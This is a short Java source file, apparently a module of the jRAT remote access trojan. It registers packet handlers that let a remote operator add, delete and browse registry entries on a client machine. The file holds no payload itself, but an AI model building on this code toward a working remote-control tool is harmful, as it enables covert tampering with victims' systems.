package jrat.module.registry;

import apiv2.StubModule;
import jrat.client.packets.incoming.AbstractIncomingPacket;

public class RegistryClientModule extends StubModule {

    public void init() {
        AbstractIncomingPacket.PACKETS_INCOMING.put((short) 97, Packet97RegistryAdd.class);
        AbstractIncomingPacket.PACKETS_INCOMING.put((short) 99, Packet99RegistryDelete.class);
        AbstractIncomingPacket.PACKETS_INCOMING.put((short) 79, Packet79BrowseRegistry.class);
        System.out.println("RegistryClientModule initialized");
    }
}
